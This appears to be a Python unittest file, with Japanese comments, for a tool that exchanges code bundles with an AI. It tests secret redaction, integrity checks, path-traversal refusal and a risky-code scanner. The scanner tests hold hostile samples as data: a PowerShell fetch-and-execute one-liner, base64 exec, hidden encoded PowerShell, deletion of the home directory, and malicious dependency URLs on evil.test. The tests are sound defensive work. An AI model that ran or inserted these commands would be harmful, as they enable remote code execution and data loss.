"""作る → 渡す → （模擬の）返信 → 確かめる → 反映 → 戻す、を通しで確かめる。"""

from __future__ import annotations

import hashlib
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

_TMP = tempfile.TemporaryDirectory()
os.environ["COPILOT_DOCK_HOME"] = str(Path(_TMP.name) / "home")

from app import aibundle, history, incoming, outgoing, prompts, scaffold, scan, skills, store, tasks  # noqa: E402


def sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def reply(files: dict[str, str], deletes=(), mode="patch", bad_sha=()) -> str:
    b = "1a2b3c4d"
    out = [f'<<<AIBUNDLE {b} version="1" mode="{mode}" project="デモ">>>']
    for p, t in files.items():
        h = "0" * 64 if p in bad_sha else sha(t)
        out += [f'<<<FILE {b} path="{p}" sha256="{h}">>>', t.rstrip("\n"), f"<<<END FILE {b}>>>"]
    out += [f'<<<DELETE {b} path="{d}">>>' for d in deletes]
    out.append(f"<<<END AIBUNDLE {b}>>>")
    return "\n".join(out)


class Flow(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.settings = store.load_settings()
        self.root, self.added = scaffold.create_project("デモ", self.tmp.name, "tk", "テスト用")
        self.proj = store.add_project("デモ", self.root, "tk")
        self.pid = self.proj["id"]
        (self.root / "main.py").write_text("print('hi')\n", encoding="utf-8")
        history.snapshot(self.root, history.L_MANUAL)

    def tearDown(self) -> None:
        self.tmp.cleanup()
        store.remove_project(self.pid)

    # ---- 新規作成
    def test_scaffold(self) -> None:
        for rel in ("AGENTS.md", "pyproject.toml", ".gitignore", ".aiignore", ".ai/roadmap.md", ".ai/run.toml", ".secrets/README.txt"):
            self.assertTrue((self.root / rel).is_file(), rel)
        self.assertEqual(len(list((self.root / ".ai/skills").glob("*.md"))), 7)
        self.assertIn("customtkinter", (self.root / "pyproject.toml").read_text(encoding="utf-8"))
        self.assertTrue(history.has_history(self.root))
        with self.assertRaises(FileExistsError):
            scaffold.create_project("デモ", self.tmp.name, "tk")

    # ---- 渡す
    def test_outgoing_keeps_secrets_out(self) -> None:
        (self.root / ".env").write_text("API_KEY=hunter2hunter2\n", encoding="utf-8")
        (self.root / ".secrets/token.txt").write_text("TOPSECRET\n", encoding="utf-8")
        pv = outgoing.preview(self.root, self.settings)
        self.assertEqual(pv["secrets"], [])
        secret_items = next(e for e in pv["excluded"] if e["reason"] == "secret")["items"]
        self.assertTrue({".env", ".secrets/"} <= set(secret_items))
        out = outgoing.build(self.pid, self.root, self.settings)
        text = "".join(Path(f["path"]).read_text(encoding="utf-8") for f in out["files"])
        self.assertNotIn("hunter2hunter2", text)
        self.assertNotIn("TOPSECRET", text)

    def test_outgoing_blocks_secret_in_source(self) -> None:
        (self.root / "main.py").write_text('API_KEY = "sk-abcdefghijklmnopqrstuvwxyz0123"\n', encoding="utf-8")
        pv = outgoing.preview(self.root, self.settings)
        self.assertEqual(len(pv["secrets"]), 1)
        with self.assertRaises(aibundle.BundleError):
            outgoing.build(self.pid, self.root, self.settings)
        out = outgoing.build(self.pid, self.root, self.settings, ignore_add=["main.py"])
        self.assertTrue(out["files"])
        pv2 = outgoing.preview(self.root, self.settings)
        self.assertEqual(pv2["secrets"], [])

    # ---- 受け取る → 確かめる → 反映 → 戻す
    def test_apply_and_restore(self) -> None:
        new = "print('hello')\n"
        meta = incoming.stage(self.pid, text=reply({"main.py": new, "util.py": "X = 1\n"}, deletes=["AGENTS.md"]))
        r = incoming.review(self.pid, self.root, meta["sid"], self.settings)
        self.assertTrue(r["can_apply"])
        self.assertEqual((r["counts"]["added"], r["counts"]["modified"], r["counts"]["deleted"]), (1, 1, 1))
        self.assertEqual(r["verified"], 2)
        d = incoming.file_diff(self.pid, self.root, meta["sid"], "main.py")
        self.assertEqual((d["added"], d["removed"]), (1, 1))
        self.assertEqual((self.root / "main.py").read_text(encoding="utf-8"), "print('hi')\n")  # まだ変わっていない
        res = incoming.apply(self.pid, self.root, meta["sid"], self.settings)
        self.assertEqual(res["counts"], {"added": 1, "modified": 1, "deleted": 1})
        self.assertEqual((self.root / "main.py").read_text(encoding="utf-8"), new)
        self.assertFalse((self.root / "AGENTS.md").exists())
        labels = [e["label"] for e in history.log(self.root)]
        self.assertEqual(labels[0], history.L_APPLY)
        before = next(e for e in history.log(self.root) if e["label"] == history.L_MANUAL)
        history.restore(self.root, before["sha"])
        self.assertEqual((self.root / "main.py").read_text(encoding="utf-8"), "print('hi')\n")
        self.assertTrue((self.root / "AGENTS.md").exists())
        self.assertFalse((self.root / "util.py").exists())
        self.assertEqual(incoming.list_sessions(self.pid), [])

    def test_broken_reply_is_refused(self) -> None:
        meta = incoming.stage(self.pid, text=reply({"main.py": "print(2)\n"}, bad_sha=("main.py",)))
        r = incoming.review(self.pid, self.root, meta["sid"], self.settings)
        self.assertFalse(r["can_apply"])
        self.assertEqual(r["broken"], ["main.py"])
        with self.assertRaises(incoming.ApplyRefused):
            incoming.apply(self.pid, self.root, meta["sid"], self.settings)
        self.assertEqual((self.root / "main.py").read_text(encoding="utf-8"), "print('hi')\n")
        p = prompts.build("resend", "デモ", {"paths": r["broken"]})
        self.assertIn("`main.py`", p["text"])

    def test_red_needs_ack(self) -> None:
        evil = "import os\nos.system(cmd)\n"
        meta = incoming.stage(self.pid, text=reply({"main.py": evil}))
        r = incoming.review(self.pid, self.root, meta["sid"], self.settings)
        self.assertEqual(r["scan"]["level"], "red")
        self.assertTrue(r["needs_ack"])
        with self.assertRaises(incoming.ApplyRefused):
            incoming.apply(self.pid, self.root, meta["sid"], self.settings)
        res = incoming.apply(self.pid, self.root, meta["sid"], self.settings, ack_red=True)
        self.assertEqual(res["red"], 1)

    def test_path_traversal_and_secret_overwrite(self) -> None:
        (self.root / ".env").write_text("K=real\n", encoding="utf-8")
        text = reply({"../evil.py": "x\n", ".env": "K=<<MASKED>>\n", "ok.py": "y\n"})
        meta = incoming.stage(self.pid, text=text)
        r = incoming.review(self.pid, self.root, meta["sid"], self.settings)
        self.assertFalse(r["can_apply"])
        self.assertFalse((Path(self.tmp.name) / "evil.py").exists())
        self.assertEqual((self.root / ".env").read_text(encoding="utf-8"), "K=real\n")

    def test_candidates_and_cleanup(self) -> None:
        dl = Path(self.tmp.name) / "downloads"
        dl.mkdir()
        s = dict(self.settings, watch_folders=[str(dl)], after_apply="archive")
        (dl / "返信 (1).md").write_text(reply({"a.py": "a = 1\n"}), encoding="utf-8")
        (dl / "memo.md").write_text("# ただのメモ\n", encoding="utf-8")
        c = incoming.candidates(self.pid, s)
        self.assertEqual(len(c), 1)
        self.assertTrue(c[0]["complete"])
        meta = incoming.stage(self.pid, paths=[f["path"] for f in c[0]["files"]])
        incoming.apply(self.pid, self.root, meta["sid"], s)
        self.assertFalse((dl / "返信 (1).md").exists())  # ダウンロード先に残さない
        self.assertTrue((dl / "memo.md").exists())  # 関係ない物は触らない
        self.assertEqual(incoming.candidates(self.pid, s), [])

    # ---- タスク・依頼文
    def test_tasks_and_prompt(self) -> None:
        doc = tasks.load(self.root)
        for t in ("CSV に書き出す", "入力が空のときの表示"):
            doc = tasks.apply_op(doc, {"op": "add", "title": t, "tags": "機能", "version": "v0.2"})
        tasks.save(self.root, doc)
        doc = tasks.load(self.root)
        ids = [t["id"] for t in tasks.all_tasks(doc)]
        self.assertEqual(ids, ["t-001", "t-002"])
        doc = tasks.apply_op(doc, {"op": "toggle", "id": "t-001"})
        tasks.save(self.root, doc)
        again = tasks.load(self.root)
        self.assertEqual([c["name"] for c in again["columns"] if any(t["id"] == "t-001" for t in c["tasks"])], ["✅ できた"])
        self.assertRegex((self.root / ".ai/roadmap.md").read_text(encoding="utf-8"), r"- \[x\] CSV に書き出す #機能 @v0\.2 .*\^t-001")
        sel = [t for t in tasks.all_tasks(again) if t["id"] == "t-002"]
        p = prompts.build("change", "デモ", {"title": "空入力の表示", "body": "空のとき警告を出す"}, sel)
        self.assertIn("入力が空のときの表示", p["text"])
        self.assertIn("t-002", p["text"])

    def test_prompt_redacts_log(self) -> None:
        log = 'File "C:\\Users\\tanaka\\app\\main.py", line 3\nKEY = "sk-abcdefghijklmnopqrstuvwxyz0123"'
        p = prompts.build("bug", "デモ", {"what": "押したら落ちた", "log": log})
        self.assertNotIn("tanaka", p["text"])
        self.assertNotIn("abcdefghijklmnopqrstuvwxyz0123", p["text"])

    def test_skills_versioning(self) -> None:
        src = Path(self.tmp.name) / "shared"
        src.mkdir()
        (src / "40_安全のきまり.md").write_text("---\nname: 安全\nversion: 9\ntitle: 新しい安全\n---\n本文\n", encoding="utf-8")
        st = {s["file"]: s for s in skills.status(self.root, str(src))}
        self.assertEqual(st["40_安全のきまり.md"]["state"], "update")
        self.assertEqual(skills.install(self.root, str(src)), ["40_安全のきまり.md"])
        self.assertIn("新しい安全", (self.root / ".ai/skills/40_安全のきまり.md").read_text(encoding="utf-8"))


class Scanner(unittest.TestCase):
    def rules(self, path: str, text: str) -> set[str]:
        return {f.rule for f in scan.scan_files({path: text})}

    def test_python_red(self) -> None:
        self.assertIn("py.eval", self.rules("a.py", "x = input()\neval(x)\n"))
        self.assertIn("py.shell", self.rules("a.py", "import subprocess\nsubprocess.run(c, shell=True)\n"))
        self.assertIn("py.reg_write", self.rules("a.py", "import winreg\nwinreg.SetValueEx(k, 'a', 0, 1, 'b')\n"))
        self.assertIn("py.net_exec", self.rules("a.py", "import requests, os\nos.startfile(requests.get(u).text)\n"))
        self.assertIn("py.obfuscate", self.rules("a.py", "import base64\nexec(base64.b64decode(s))\n"))
        self.assertIn("str.ps_hidden", self.rules("a.py", "cmd = 'powershell -WindowStyle Hidden -enc AAAA'\n"))
        self.assertIn("py.delete_out", self.rules("a.py", "import shutil, os\nshutil.rmtree(os.path.expanduser('~'))\n"))

    def test_python_calm(self) -> None:
        calm = "import json\nfrom pathlib import Path\n\ndef f(p):\n    return json.loads(Path(p).read_text())\n"
        self.assertEqual(self.rules("a.py", calm), set())
        self.assertEqual(scan.summarize(scan.scan_files({"a.py": calm}))["level"], "green")

    def test_python_yellow(self) -> None:
        self.assertIn("py.net", self.rules("a.py", "import requests\nrequests.get('https://api.example.net')\n"))
        self.assertIn("py.subprocess", self.rules("a.py", "import subprocess\nsubprocess.run(['notepad'])\n"))
        self.assertIn("str.expose", self.rules("a.py", "app.run(host='0.0.0.0')\n"))

    def test_scripts_and_names(self) -> None:
        self.assertIn("sc.iex", self.rules("run.ps1", "iwr http://x.test/a.ps1 | iex\n"))
        self.assertIn("sc.reg", self.rules("setup.bat", "reg add HKCU\\Software\\X /v a\n"))
        self.assertIn("path.exe", self.rules("tool.exe", "MZ"))
        self.assertIn("path.sitecustomize", self.rules("sitecustomize.py", "pass\n"))

    def test_pyproject(self) -> None:
        old = '[project]\nname="a"\nversion="0"\ndependencies=["requests>=2"]\n'
        new = ('[project]\nname="a"\nversion="0"\ndependencies=["requests>=2","reqeusts","numpi","foo @ https://evil.test/foo.whl"]\n'
               '[[tool.uv.index]]\nurl="https://evil.test/simple"\n')
        findings, deps = scan.scan_pyproject("pyproject.toml", new, old)
        rules = {f.rule for f in findings}
        self.assertEqual(set(deps["added"]), {"reqeusts", "numpi", "foo"})
        self.assertTrue({"pp.lookalike", "pp.url_dep", "pp.index"} <= rules)
        self.assertEqual(scan.lookalike("numpy"), None)
        self.assertEqual(scan.lookalike("my-own-tool"), None)
        findings2, _ = scan.scan_pyproject("pyproject.toml", new, old, allowed_index="https://evil.test/simple")
        self.assertNotIn("pp.index", {f.rule for f in findings2})

    def test_secrets(self) -> None:
        hits = scan.find_secrets({
            "a.py": 'password = "hunter2hunter2"\nAWS = "AKIAABCDEFGHIJKLMNOP"\nok = "your_password_here"\n',
            "b.txt": "-----BEGIN RSA PRIVATE KEY-----\n", "c.py": 'token = os.environ["TOKEN"]\nx = "<token>"\n'})
        self.assertEqual({(f.path, f.line) for f in hits}, {("a.py", 1), ("a.py", 2), ("b.txt", 1)})
        self.assertNotIn("hunter2hunter2", " ".join(f.snippet for f in hits))


if __name__ == "__main__":
    unittest.main()
